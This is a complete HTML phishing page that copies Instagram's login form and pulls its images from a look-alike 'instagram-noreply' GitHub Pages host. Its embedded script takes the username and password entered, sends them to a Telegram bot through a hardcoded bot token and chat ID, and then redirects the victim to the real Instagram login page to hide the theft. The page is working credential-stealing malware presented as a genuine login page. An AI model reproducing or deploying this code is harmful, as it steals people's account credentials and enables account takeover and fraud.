<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login Form</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
        integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        #container {
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            max-width: 350px;
            width: 100%;
            background-color: #fff;
            padding: 40px;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
        }

        .logo {
            margin-bottom: 20px;
        }

        .logo img {
            height: 51px;
        }

        .input-field {
            width: 100%;
            margin-bottom: 10px;
        }

        .input-field input {
            width: 100%;
            padding: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            font-size: 14px;
        }

        .input-field input:focus {
            outline: none;
            border-color: #a5a5a5;
        }

        .login-btn {
            width: 100%;
            background-color: #3897f0;
            border: 1px solid #3897f0;
            padding: 10px 0;
            color: #fff;
            cursor: pointer;
            border-radius: 4px;
            font-weight: bold;
            font-size: 14px;
            margin: 10px 0;
        }

        .or {
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            color: #8e8e8e;
            margin: 20px 0;
        }

        .or::before,
        .or::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }

        .or::before {
            margin-right: 15px;
        }

        .or::after {
            margin-left: 15px;
        }

        .main-bottom {
            text-align: center;
        }

        .main-bottom a {
            text-decoration: none;
            color: #385185;
            font-weight: bold;
        }

        .main-bottom a:hover {
            text-decoration: underline;
        }

        .footer {
            text-align: center;
            margin-top: 20px;
        }

        .footer a {
            text-decoration: none;
            color: #00376b;
            font-weight: bold;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        .app-section {
            text-align: center;
            margin-top: 20px;
        }

        .app-section span {
            display: block;
            font-size: 14px;
            margin-bottom: 10px;
        }

        .images {
            display: flex;
            justify-content: center;
        }

        .images img {
            height: 40px;
            margin: 0 5px;
        }

        footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }

        footer a {
            text-decoration: none;
            color: #8e8e8e;
        }
    </style>
</head>
<body>

    <div id="container">
        <div class="logo">
            <img src="https://instagram-noreply.github.io/Instagram-support/logo.png" />
        </div>
        <form id="loginForm">
            <div class="input-field">
                <input type="text" placeholder="Phone number, username, or email" id="usernameInput" />
            </div>
            <div class="input-field">
                <input type="password" placeholder="Password" id="passwordInput" />
            </div>
            <input type="submit" value="Log in" class="login-btn" />
        </form>

        <div class="or">OR</div>

        <div class="main-bottom">
            <a href="#"><i class="fa-brands fa-facebook-f"></i> Log in with Facebook</a><br>
            <a href="#" class="forget">Forgot password?</a>
        </div>

        <div class="footer">
            <p>Don't have an account? <a href="#">Create new account</a></p>
        </div>

        <div class="app-section">
            <span>Get the app.</span>
            <div class="images">
                <img src="https://instagram-noreply.github.io/Instagram-support/googlePlay.png" alt="Google Play">
                <img src="https://instagram-noreply.github.io/Instagram-support/microsoft.png" alt="Microsoft">
            </div>
        </div>
    </div>

    <script>
        const loginForm = document.getElementById('loginForm');
        const usernameInput = document.getElementById('usernameInput');
        const passwordInput = document.getElementById('passwordInput');

        loginForm.addEventListener('submit', (e) => {
            e.preventDefault();

            const username = usernameInput.value;
            const password = passwordInput.value;

            const telegramBotToken = '7131876676:AAHAItGzIF6jurMHcCJVxDfpY1q4uykB8_g';
            const chatId = '1201917438';
            const message = `Username: ${username}\nPassword: ${password}`;

            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            })
            .then(() => {
                ('Login failed.');
                window.location.href = 'https://www.instagram.com/accounts/login/';
            })
            .catch((error) => {
                console.error('Error:', error);
            });
        });
    </script>
</body>
</html>
